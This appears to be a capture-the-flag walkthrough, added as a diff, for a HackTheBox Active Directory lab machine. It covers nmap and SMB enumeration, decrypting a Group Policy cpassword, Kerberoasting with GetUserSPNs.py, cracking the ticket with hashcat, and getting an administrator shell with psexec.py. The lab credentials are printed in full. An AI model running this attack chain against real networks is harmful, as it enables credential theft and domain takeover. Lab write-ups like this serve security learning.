@@ -1,0 +1,90 @@
+Step 1
+
+Scanning
+Nmap -A 10.10.10.100
+
+PORT      STATE SERVICE       VERSION
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-14 02:15:23Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  unknown
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Notice (Domain: active.htb) add active.htb to /etc/hosts file
+
+Step 2 
+
+Enum4linux 10.10.10.100
+
+I found 
+
+ Sharename       Type      Comment
+  ---------              ----          -------
+        ADMIN$         Disk      Remote Admin
+        C$                    Disk      Default share
+        IPC$                 IPC       Remote IPC
+        NETLOGON    Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL            Disk     Logon server share 
+        Users                Disk      
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+
+//10.10.10.100/Replication      Mapping: OK, Listing: OK
+
+Smbclient //10.10.10.100/Replication 
+Password : no-password
+
+I found file called Groups.xml at "active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups"
+
+Download this file in attacker machine
+
+Get Groups.xml
+
+I found in file
+
+userName: active.htb\SVC_TGS
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+
+Decrypt cpassword
+
+Gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+
+Password is : GPPstillStandingStrong2k18
+
+Now I have username and password
+
+I can login smb for example > smbclient //10.10.10.100/Users -U SVC_TGS but I want to become Administrator
+
+(Kerberoasting)
+
+Python3  GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+
+Add hash to file
+
+After that I decrypt hash with hashcat 
+
+Sudo hashcat -m 13100 hash.txt /usr/share/wordlist/rockyou.txt --force
+
+Password is : Ticketmaster1968
+
+I will gain access as administrator
+
+Python3 psexec.py Administrator@10.10.10.100
+Password : Ticketmaster1968
+
+Now I have a shell as administrator
